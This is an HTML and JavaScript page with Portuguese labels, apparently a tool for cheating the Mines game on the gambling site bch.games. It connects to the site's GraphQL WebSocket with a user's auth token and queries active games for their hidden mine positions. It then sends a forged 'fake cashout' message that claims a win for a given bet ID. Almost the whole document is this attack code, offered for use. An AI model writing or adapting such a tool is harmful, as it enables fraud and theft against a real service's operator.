<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Interceptador de Cashout BCH.games</title>
</head>
<body>
    <h2>Interceptador de Cashout</h2>

    <!-- Campo para token -->
    <label for="token">Auth Token:</label>
    <input type="text" id="token" placeholder="Cole seu auth_token_v1">
    <button onclick="autenticar()">Login</button>
    <p id="status">‚è≥ Aguardando autentica√ß√£o...</p>

    <!-- Bot√£o para obter jogos ativos -->
    <button onclick="obterJogos()">Obter Jogos Ativos</button>

    <!-- Campo e bot√£o para cashout falso -->
    <label for="betId">ID da Aposta:</label>
    <input type="text" id="betId" placeholder="Cole o _id da aposta">
    <button onclick="cashoutFake()">Cashout Falso</button>

    <p id="resultado"></p>

    <script>
        let ws;

        function autenticar() {
            const token = document.getElementById("token").value;
            if (!token) {
                alert("Por favor, insira seu auth_token_v1!");
                return;
            }

            ws = new WebSocket("wss://bch.games/api/graphql", "graphql-transport-ws");

            ws.onopen = () => {
                document.getElementById("status").textContent = "‚úÖ Conectado!";
                ws.send(JSON.stringify({ type: "connection_init", payload: {} }));

                // Autentica√ß√£o
                const authPayload = {
                    id: "1",
                    type: "subscribe",
                    payload: {
                        query: `{ authenticate(authToken: "${token}") { _id username email } }`,
                        variables: {}
                    }
                };

                ws.send(JSON.stringify(authPayload));
            };

            ws.onmessage = (event) => {
                const data = JSON.parse(event.data);
                console.log("üì© Mensagem recebida:", data);

                if (data.payload?.data?.authenticate) {
                    document.getElementById("status").textContent = `‚úÖ Logado como ${data.payload.data.authenticate.username}`;
                } else if (data.payload?.data?.minesCashout) {
                    document.getElementById("resultado").textContent = `üíé Fake Cashout! Minas: ${JSON.stringify(data.payload.data.minesCashout.details.mines)}`;
                }
            };

            ws.onerror = (err) => {
                console.error("‚ùå Erro:", err);
            };

            ws.onclose = () => {
                document.getElementById("status").textContent = "üî¥ WebSocket desconectado!";
            };
        }

        function obterJogos() {
            const payload = {
                id: "2",
                type: "subscribe",
                payload: {
                    query: `{ minesGetActiveGames { _id amount details { ... on MinesGameDetails { mines uncovered minesCount } } } }`,
                    variables: {}
                }
            };

            ws.send(JSON.stringify(payload));
        }

        function cashoutFake() {
            const betId = document.getElementById("betId").value;
            if (!betId) {
                alert("Por favor, insira o _id da aposta!");
                return;
            }

            const payload = {
                id: "fake-cashout",
                type: "next",
                payload: {
                    data: {
                        minesCashout: {
                            id: betId,
                            isWin: true,
                            mines: [1, 5, 9, 13, 17], // Simula√ß√£o fixa
                            uncovered: [2, 3, 4],
                            minesCount: 5
                        }
                    }
                }
            };

            ws.send(JSON.stringify(payload));
            document.getElementById("resultado").textContent = "‚úÖ Cashout falso enviado!";
        }
    </script>
</body>
</html>
